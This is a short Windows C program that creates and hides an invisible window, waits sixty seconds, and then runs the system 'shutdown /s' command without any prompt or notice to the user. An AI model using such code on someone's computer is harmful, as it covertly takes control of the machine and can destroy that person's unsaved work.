#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WNDCLASSEX wndClass = {0};
    wndClass.cbSize = sizeof(WNDCLASSEX);
    wndClass.lpfnWndProc = DefWindowProc;
    wndClass.hInstance = hInstance;
    wndClass.lpszClassName = "HiddenWindowClass";
    RegisterClassEx(&wndClass);
	
    HWND hWnd = CreateWindowEx(
        0,
        "HiddenWindowClass",
        "",
        0,
        0, 0, 0, 0,
        NULL,
        NULL,
        hInstance,
        NULL
    );
	
    ShowWindow(hWnd, SW_HIDE);
    
    Sleep(60000);
	system("C:\\WINDOWS\\System32\\shutdown /s");
	
    DestroyWindow(hWnd);
    UnregisterClass("HiddenWindowClass", hInstance);
    
    return 0;
}
